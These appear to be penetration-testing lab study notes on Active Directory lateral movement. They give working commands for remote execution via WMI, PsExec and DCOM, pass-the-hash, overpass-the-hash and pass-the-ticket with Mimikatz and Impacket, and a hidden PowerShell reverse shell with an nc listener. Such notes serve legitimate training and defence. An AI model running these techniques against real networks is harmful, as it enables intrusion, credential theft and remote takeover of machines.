# Active Directory Lateral Movement

- <https://attack.mitre.org/tactics/TA0008/>

These techniques may use the current valid account or reuse authentication material such as password hashes, Kerberos Otickets, and application access tokens obtained from the previous attack stages.




## WMI and WinRM
Windows Management Instrumentation is an object-oriented feature that facilitates task automation.

The `wmic` utility has been recently deprecated.

We need credentials of a member of the Administrators local group, which can also be a domain user.



```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```



### Using PowerShell
Translating this attack into PowerShell syntax requires a few extra details.

First, We need to create a `PSCredential` object that will store our session username and password.

To do that, we will first store the username and password in variables.

Then, we will secure the password via the `ConvertTo-SecureString` cmdlet. 

Finally, we'll create a new `PSCredential` object with the username variable and `secureString` object.


```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
- <https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.4>

Now that we have our `PSCredential` object, we need to create a Common Information Model (CIM) via the `New-CimSession` cmdlet.

To do that, we'll first specify DCOM as the protocol for the WMI session with the `New-CimSessionOption` cmdlet on the first line. On the second line, we'll create the new session, `New-Cimsession` against our target IP, using `-ComputerName` and supply the `PSCredential` object (-Credential $credential) along with the session options (-SessionOption $Options). Lastly, we'll define 'calc' as the payload to be executed by WMI.

```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.214.72 -Credential $credential -SessionOption $Options
$command = 'calc';
```

As a final step, we need to tie together all the arguments we configured previously by issuing the `Invoke-CimMethod` cmdlet and supplying `Win32_Process` to the ClassName and Create to the MethodName. To send the argument, we wrap them in `@{CommandLine =$Command}`.

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```




### WinRM






## PsExec
Part of SysInternals.

It's intended to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console.





3 requisites must be met.

1. the user that authenticates to the target machine needs to be part of the Administrators local group
2. the ADMIN$ share must be available
3. File and Printer Sharing has to be turned on

Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.






To execute the command remotely, PsExec performs the following tasks:

- Writes psexesvc.exe into the C:\Windows directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of psexesvc.exe



```
PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```












## Pash the Hash (PtH)

Authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password.
(This will only work for servers or services using NTLM authentication, not for servers or services using Kerberos)

- PsExec from Metasploit
- Passing-the-hash toolkit (<https://github.com/byt3bl33d3r/pth-toolkit>)
- Impacket





Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.

Unless we want to gain remote code execution, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share.


Same requisites as PsExec.




### Impacket

```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.220.73
```



If the target was sitting behind a network that was only reachable through our initial compromised access, we could perform this very same attack by pivoting and proxying through the first host






## Overpass the Hash
With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the `sekurlsa::pth` command from Mimikatz.


### Mimikatz
Use `sekurlsa::logonpasswords` to get NTLM hash which we will leverage to overpass the hash.



Use `/run`: to specify the process to create (in this case, PowerShell).

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

At this point, we have a new PowerShell session that allows us to execute commands as jen.

At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets.

`klist` will show no Kerberos tickets have been cached, but this is expected since jen has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with net use.



```
net use \\files04
```

Now let's use the `klist` again to list the newly requested Kerberos tickets.

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). Here we will use the official PsExec application from Microsoft.

```
PsExec.exe \\files04 cmd
```










## Pass the Ticket
Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Example:

- Abuse an already existing session of the user dave, that has privileged access to the backup folder located on WEB04 whereas our logged-in user jen does not.

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.

```
whoami #jen
ls \\web04\backup # Access to the path '\\web04\backup' is denied
```

Launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the `sekurlsa::tickets /export`

```
privilege::debug

# Parse the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format.
sekurlsa::tickets /export
```


Verify newly generated tickets with dir, filtering out on the kirbi extension.
```
dir *.kirbi
```




As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```



We should expect the ticket in our session when running `klist`.

Now confirm we have been granted access to the restricted shared folder.
```
ls \\web04\backup
```

















## DCOM
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

- <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN>


- <https://www.cybereason.com/blog/dcom-lateral-movement-techniques>

- <https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/>



The discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of Application Objects, which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. As its name suggests, this method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.


Example:

We are going to demonstrate this lateral movement attack as the jen user logged in from the already compromised Windows 11 CLIENT74 host.

From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the `GetTypeFromProgID` method.

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.188.72"))
```

Then we can pass the required argument to the application via the `ExecuteShellCommand` method.

The method accepts four parameters: Command, Directory, Parameters, and WindowState. We're only interested in the first and third parameters, which will be populated with `cmd` and `/c calc`, respectively.


```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

Verify the calculator app is running:
```
tasklist | findstr "calc"
```



Instead of calc add a Reverse Shell:

```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e [BASE 64 ENCODED SHELL],"7")
```

While in the attacker machine:
```
nc -lnvp 443
```






























